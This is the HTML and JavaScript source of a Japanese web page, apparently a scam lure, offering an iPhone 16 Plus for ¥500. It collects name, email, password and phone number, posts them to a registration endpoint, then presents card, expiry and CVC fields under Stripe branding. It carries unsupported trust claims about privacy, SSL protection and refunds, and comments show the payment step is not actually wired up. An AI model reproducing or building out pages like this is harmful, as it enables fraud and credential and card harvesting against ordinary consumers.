<!DOCTYPE html>
<html lang="ja">
<head>

<!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8');
  </script>

  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
  <title>jp iphone</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd; --cta1:#ffd76b; --cta2:#ffb429; --radius:16px;
    }
    *{box-sizing:border-box}
    body{
      margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; 
      background:var(--bg); color:var(--text);
      display:flex; flex-direction:column; align-items:center; justify-content:flex-start;
      padding:18px 14px 40px;
    }
    .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
    .card{
      width:min(700px,100%); background:var(--card); border:1px solid var(--line);
      border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
    }
    .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
    .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
    .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
    .btn{
      width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
      font-weight:900; cursor:pointer; font-size:16px; 
      background:linear-gradient(180deg,var(--cta1),var(--cta2));
      box-shadow:0 8px 18px rgba(255,174,15,.25);
    }
    .btn-row{ display:flex; gap:12px; margin-top:12px }
    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }
    .step{ display:none }
    .step[aria-hidden="false"]{ display:block }
    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
    .brands img{height:22px}
    .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
    #err[aria-hidden="false"]{ display:block; }
    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
    .loading-overlay[aria-hidden="false"]{ display:flex }
    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
    .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }

    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
    @media (max-width:520px){
      .phone-wrap{ grid-template-columns:1fr; }
    }
  </style>
</head>
<body>

<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>

  <div class="shell">

    <!-- STEP 1 -->
    <section id="step1" class="card step" aria-hidden="false">
      <h1 class="title">
        iPhone 16 Plus を <span id="priceHero" data-price> ¥500</span> で入手！
      </h1>
      <p class="sub">期間限定オファー。今すぐ新しい iPhone を手に入れよう！</p>

      <div class="img-wrap">
        <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus"/>
      </div>

      <div class="grid">
        <input class="input" id="nameInput" placeholder="氏名" autocomplete="name" required />
        <input class="input" id="emailInput" type="email" placeholder="メールアドレス" autocomplete="email" required />
        <input class="input" id="passwordInput" type="password" placeholder="パスワードを作成" autocomplete="new-password" required />
        <div class="phone-wrap">
          <select id="phonePrefix" class="input" aria-label="国番号">
            <option value="+81" selected>+81 — 日本</option>
          </select>
          <input id="phoneNumber" class="input" inputmode="tel" placeholder="電話番号" autocomplete="tel-national" />
        </div>
      </div>

      <div class="btn-row">
        <button id="nextBtn" class="btn">次へ →</button>
      </div>
      <p class="trust-text">メールアドレスを第三者と共有することはありません。プライバシーは100%保証されます。</p>
    </section>

    <!-- STEP 2 -->
    <section id="step2" class="card step" aria-hidden="true">
      <h2 class="title">安全なお支払い</h2>
      <p class="sub">お客様の情報は安全に保護されています — Stripe によって処理されます。</p>

      <div id="gpay-button"></div>

      <div class="label">カード番号</div>
      <div id="card-number" class="el"></div>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
        <div>
          <div class="label">有効期限</div>
          <div id="card-expiry" class="el"></div>
        </div>
        <div>
          <div class="label">CVC</div>
          <div id="card-cvc" class="el"></div>
        </div>
      </div>

      <div id="err" role="alert" aria-hidden="true"></div>

      <div class="btn-row">
        <button id="backBtn" class="btn muted-btn">← 戻る</button>
        <button class="btn" id="payNow"><span id="priceButton" data-price>¥500</span> を安全に支払う</button>
      </div>

      <div class="brands">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
        <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
      </div>

      <p class="trust-text">🔒 256ビット SSL で保護 · Stripe による決済 · 30日間返金保証</p>
    </section>
  </div>

  <!-- Loading overlay -->
  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
    <div class="loading-box">
      <div class="loading-title">お支払いを処理中…</div>
      <div class="progress-wrap"><div class="progress-bar"></div></div>
      <p class="sub">少々お待ちください。この処理には数秒かかる場合があります。</p>
    </div>
  </div>

  <!-- Stripe.js -->
  <script src="https://js.stripe.com/v3"></script>
  <script>
    /* ---------- Step navigation & account creation (added so Next works) ---------- */
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const nameInput = document.getElementById('nameInput');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const phonePrefix = document.getElementById('phonePrefix');
    const phoneNumber = document.getElementById('phoneNumber');

    async function ensureAccount(){
      const email = (emailInput.value || '').trim();
      const password = passwordInput.value || '';
      const rawPhone = (phoneNumber.value || '').replace(/[^\d]/g,'');
      const prefix = (phonePrefix.value || '+81').trim();
      const phone = rawPhone ? `${prefix}${rawPhone}` : '';

      if(!nameInput.value || !email || !password){
        alert('氏名・メール・パスワードを入力してください。');
        throw new Error('Missing required fields');
      }

      const res = await fetch('/api/register', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email, password, phone })
      });

      if(res.status === 201) return true;

      let data = {};
      try { data = await res.json(); } catch {}
      if(res.status === 400 && /exists/i.test(data?.error || '')) return true;

      throw new Error(data?.error || 'アカウントを作成できませんでした。');
    }

    document.getElementById('nextBtn').onclick = async () => {
      try {
        await ensureAccount();
      } catch(e){
        // error message already surfaced above if needed
        return;
      }
      // persist a couple of fields if you use them later
      try {
        localStorage.setItem('checkout_name', nameInput.value || '');
        localStorage.setItem('checkout_email', emailInput.value || '');
      } catch {}

      step1.setAttribute('aria-hidden', 'true');
      step2.setAttribute('aria-hidden', 'false');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    };

    document.getElementById('backBtn').onclick = () => {
      step1.setAttribute('aria-hidden', 'false');
      step2.setAttribute('aria-hidden', 'true');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    };

    /* ---------- Static Japan-only price text (already set in HTML) ---------- */
    (function fixJapanPrice(){
      const symbol = '¥';
      const amount = '500';
      document.querySelectorAll('[data-price]').forEach(el=>{
        el.textContent = `${symbol}${amount}`;
      });
      document.title = `jp iphone`;
    })();

    /* ---------- (Optional) Stripe mounting: safe no-op if you wire later ---------- */
    // If you plan to complete payments on step 2, mount Elements here.
    // Leaving it out won’t break the Next button anymore.

  </script>
</body>
</html>
